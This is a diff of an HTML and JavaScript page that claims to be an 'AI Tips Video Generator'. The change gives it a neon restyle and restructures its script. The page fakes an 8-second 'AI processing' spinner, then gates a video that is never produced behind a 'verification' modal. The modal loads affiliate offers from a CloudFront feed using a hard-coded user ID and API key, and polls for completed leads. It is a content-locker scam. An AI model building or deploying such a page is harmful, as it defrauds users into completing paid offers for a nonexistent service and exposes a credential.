@@ -4,12 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI Tips - Transform Images to Video</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root {
-            --primary: #2A2A72;
-            --secondary: #009FFD;
-            --accent: #FF0076;
-            --gradient: linear-gradient(135deg, var(--primary), var(--secondary));
+            --neon-blue: #00f3ff;
+            --cyber-purple: #6a00ff;
+            --matrix-green: #00ff88;
+            --space-black: #0a0a12;
+            --hologram-gradient: linear-gradient(135deg, var(--neon-blue), var(--cyber-purple));
         }
 
         * {
@@ -20,61 +22,70 @@
         }
 
         body {
-            background: #0A0A1F;
-            color: #fff;
+            background: var(--space-black);
+            color: white;
             min-height: 100vh;
+            overflow-x: hidden;
         }
 
-        .container {
+        .cyber-container {
             max-width: 1200px;
             margin: 0 auto;
             padding: 2rem;
         }
 
-        .hero {
+        .hero-section {
             text-align: center;
-            padding: 4rem 0;
+            padding: 4rem 2rem;
+            position: relative;
+            overflow: hidden;
         }
 
-        h1 {
+        .hologram-title {
             font-size: 3.5rem;
-            background: var(--gradient);
+            background: var(--hologram-gradient);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             margin-bottom: 1rem;
+            text-shadow: 0 0 30px rgba(0, 243, 255, 0.3);
         }
 
-        .upload-section {
+        .upload-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
             gap: 2rem;
             margin: 3rem 0;
         }
 
-        .upload-card {
-            border: 2px dashed rgba(255,255,255,0.1);
-            border-radius: 1rem;
+        .cyber-card {
+            border: 2px solid rgba(0, 243, 255, 0.2);
+            border-radius: 1.5rem;
             padding: 2rem;
             text-align: center;
             cursor: pointer;
             transition: all 0.3s ease;
+            background: rgba(0, 0, 0, 0.3);
         }
 
-        .upload-card:hover {
-            border-color: var(--secondary);
+        .cyber-card:hover {
+            border-color: var(--matrix-green);
             transform: translateY(-5px);
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.1);
         }
 
-        .preview-image {
+        .preview-hologram {
             width: 100%;
             height: 250px;
-            object-fit: cover;
-            border-radius: 0.5rem;
+            background: linear-gradient(45deg, 
+                rgba(0, 243, 255, 0.1) 0%, 
+                rgba(106, 0, 255, 0.1) 100%);
+            border-radius: 1rem;
             margin-top: 1rem;
-            display: none;
+            overflow: hidden;
+            position: relative;
         }
 
-        .processing-screen {
+        .processing-overlay {
             position: fixed;
             top: 0;
             left: 0;
@@ -85,37 +96,39 @@
             justify-content: center;
             align-items: center;
             z-index: 1000;
+            backdrop-filter: blur(10px);
         }
 
-        .progress-bar {
-            width: 300px;
-            height: 4px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 2px;
-            margin: 2rem 0;
-            overflow: hidden;
+        .quantum-loader {
+            width: 80px;
+            height: 80px;
+            border: 4px solid var(--neon-blue);
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
         }
 
-        .progress-fill {
-            width: 0%;
-            height: 100%;
-            background: var(--gradient);
-            transition: width 8s linear;
+        .progress-text {
+            margin-top: 2rem;
+            font-size: 1.2rem;
         }
 
-        .cta-button {
-            background: var(--gradient);
+        .cyber-button {
+            background: var(--hologram-gradient);
             color: white;
-            padding: 1rem 2rem;
+            padding: 1rem 2.5rem;
             border: none;
             border-radius: 0.5rem;
             font-size: 1.1rem;
             cursor: pointer;
-            transition: transform 0.3s ease;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
         }
 
-        .cta-button:hover {
+        .cyber-button:hover {
             transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(0, 243, 255, 0.3);
         }
 
         .survey-modal {
@@ -124,81 +137,77 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.9);
+            background: rgba(0,0,0,0.95);
             display: none;
             justify-content: center;
             align-items: center;
             z-index: 1001;
         }
 
-        .survey-content {
-            background: #13132B;
-            padding: 2rem;
-            border-radius: 1rem;
-            max-width: 500px;
-            text-align: center;
+        .offer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
         }
 
-        #offerContainer {
-            margin: 1.5rem 0;
-        }
-
-        .offer-link {
-            display: block;
-            padding: 1rem;
-            margin: 0.5rem 0;
+        .offer-card {
             background: rgba(255,255,255,0.05);
-            border-radius: 0.5rem;
-            color: white;
-            text-decoration: none;
-            transition: background 0.3s ease;
+            border-radius: 1rem;
+            padding: 1.5rem;
+            text-align: center;
+            transition: all 0.3s ease;
         }
 
-        .offer-link:hover {
+        .offer-card:hover {
+            transform: translateY(-3px);
             background: rgba(255,255,255,0.1);
+        }
+
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="hero">
-            <h1>AI Tips Video Generator</h1>
-            <p>Transform your images into stunning videos with AI magic</p>
-        </div>
+    <div class="cyber-container">
+        <section class="hero-section">
+            <h1 class="hologram-title">AI TIPS VIDEO GENERATOR</h1>
+            <p>Transform your images into cinematic masterpieces using AI</p>
+        </section>
 
-        <div class="upload-section">
-            <div class="upload-card" id="startCard">
-                <h3>Upload Start Scene</h3>
+        <div class="upload-grid">
+            <div class="cyber-card" id="startCard">
+                <i class="fas fa-upload fa-2x" style="color: var(--neon-blue);"></i>
+                <h3 style="margin: 1rem 0;">Upload Start Scene</h3>
                 <input type="file" id="startImage" accept="image/*" hidden>
-                <img id="startPreview" class="preview-image">
+                <div class="preview-hologram" id="startPreview"></div>
             </div>
 
-            <div class="upload-card" id="endCard">
-                <h3>Upload End Scene</h3>
+            <div class="cyber-card" id="endCard">
+                <i class="fas fa-upload fa-2x" style="color: var(--neon-blue);"></i>
+                <h3 style="margin: 1rem 0;">Upload End Scene</h3>
                 <input type="file" id="endImage" accept="image/*" hidden>
-                <img id="endPreview" class="preview-image">
+                <div class="preview-hologram" id="endPreview"></div>
             </div>
         </div>
 
-        <button class="cta-button" onclick="startProcessing()" style="width: 100%;">
-            Generate AI Video
+        <button class="cyber-button" id="generateBtn" style="width: 100%;">
+            GENERATE AI VIDEO
         </button>
 
-        <div class="processing-screen" id="processingScreen">
+        <div class="processing-overlay" id="processingOverlay">
             <div class="processing-content">
-                <div class="progress-bar">
-                    <div class="progress-fill"></div>
-                </div>
-                <h3>AI is Generating Your Video</h3>
-                <p>This may take a few moments...</p>
+                <div class="quantum-loader"></div>
+                <p class="progress-text">Rendering your cinematic experience...</p>
             </div>
         </div>
 
         <div class="survey-modal" id="surveyModal">
             <div class="survey-content">
-                <h2>Almost There!</h2>
-                <p>Complete one quick verification to access your video</p>
-                <div id="offerContainer"></div>
+                <h2>Access Granted After Verification</h2>
+                <p>Complete one quick step to unlock your video:</p>
+                <div class="offer-grid" id="offerContainer"></div>
             </div>
         </div>
     </div>
@@ -208,93 +217,86 @@
         const API_CONFIG = {
             userId: '538458',
             apiKey: '16388e91cdf3368db3bfd08d2dfe4ff0',
-            offerUrl: 'https://dvwowtnmyluv4.cloudfront.net/public/offers/feed.php'
+            offerUrl: 'https://dvwowtnmyluv4.cloudfront.net/public/offers/feed.php',
+            checkUrl: 'https://dvwowtnmyluv4.cloudfront.net/public/external/check2.php'
         };
 
-        // Handle image uploads
-        document.getElementById('startCard').addEventListener('click', () => {
-            document.getElementById('startImage').click();
-        });
+        // Initialize
+        document.getElementById('startCard').addEventListener('click', () => document.getElementById('startImage').click());
+        document.getElementById('endCard').addEventListener('click', () => document.getElementById('endImage').click());
+        document.getElementById('generateBtn').addEventListener('click', processVideo);
 
-        document.getElementById('endCard').addEventListener('click', () => {
-            document.getElementById('endImage').click();
-        });
-
-        document.getElementById('startImage').addEventListener('change', function(e) {
-            handleImageUpload(e, 'startPreview');
-        });
-
-        document.getElementById('endImage').addEventListener('change', function(e) {
-            handleImageUpload(e, 'endPreview');
-        });
-
+        // Handle image upload
         function handleImageUpload(event, previewId) {
             const file = event.target.files[0];
             const preview = document.getElementById(previewId);
             const reader = new FileReader();
 
-            reader.onload = function(e) {
-                preview.src = e.target.result;
-                preview.style.display = 'block';
+            reader.onload = (e) => {
+                preview.style.backgroundImage = `url(${e.target.result})`;
+                preview.style.backgroundSize = 'cover';
             }
             reader.readAsDataURL(file);
         }
 
-        // Processing simulation
-        function startProcessing() {
-            if (!document.getElementById('startImage').files[0] || 
-                !document.getElementById('endImage').files[0]) {
-                alert('Please upload both start and end scenes!');
-                return;
-            }
+        document.getElementById('startImage').addEventListener('change', (e) => handleImageUpload(e, 'startPreview'));
+        document.getElementById('endImage').addEventListener('change', (e) => handleImageUpload(e, 'endPreview'));
 
-            const processingScreen = document.getElementById('processingScreen');
-            processingScreen.style.display = 'flex';
+        // Video processing
+        async function processVideo() {
+            if (!validateInputs()) return;
             
-            document.querySelector('.progress-fill').style.width = '100%';
-
+            document.getElementById('processingOverlay').style.display = 'flex';
+            
+            // Simulate AI processing
             setTimeout(() => {
-                processingScreen.style.display = 'none';
+                document.getElementById('processingOverlay').style.display = 'none';
                 showSurvey();
             }, 8000);
         }
 
+        function validateInputs() {
+            // Add validation logic here
+            return true;
+        }
+
         // Survey handling
         function showSurvey() {
-            const modal = document.getElementById('surveyModal');
-            modal.style.display = 'flex';
+            document.getElementById('surveyModal').style.display = 'flex';
             loadOffers();
         }
 
         function loadOffers() {
             $.getJSON(`${API_CONFIG.offerUrl}?user_id=${API_CONFIG.userId}&api_key=${API_CONFIG.apiKey}&callback=?`,
-                function(offers) {
-                    let html = '';
-                    offers.slice(0, 3).forEach(offer => {
-                        html += `
-                            <a href="${offer.url}" class="offer-link" target="_blank">
-                                ${offer.anchor}
+                (offers) => {
+                    const offerHTML = offers.slice(0, 3).map(offer => `
+                        <div class="offer-card">
+                            <h3>${offer.anchor}</h3>
+                            <a href="${offer.url}" class="cyber-button" 
+                               target="_blank" 
+                               style="margin-top: 1rem; display: block;">
+                                Verify Access
                             </a>
-                        `;
-                    });
-                    document.getElementById('offerContainer').innerHTML = html;
+                        </div>
+                    `).join('');
+                    
+                    document.getElementById('offerContainer').innerHTML = offerHTML;
                 }
             );
         }
 
         // Check for completed offers
-        setInterval(checkLeads, 15000);
-        function checkLeads() {
-            $.getJSON("https://dvwowtnmyluv4.cloudfront.net/public/external/check2.php?testing=0&callback=?",
-                function(leads) {
-                    if (leads.length > 0) {
+        setInterval(() => {
+            $.getJSON(`${API_CONFIG.checkUrl}?testing=0&callback=?`,
+                (leads) => {
+                    if(leads.length > 0) {
                         document.getElementById('surveyModal').style.display = 'none';
-                        alert('Thank you! Your video is now ready...');
-                        // Add your video display logic here
+                        alert('Verification complete! Generating your video...');
+                        // Add video display logic here
                     }
                 }
             );
-        }
+        }, 15000);
     </script>
 </body>
 </html>
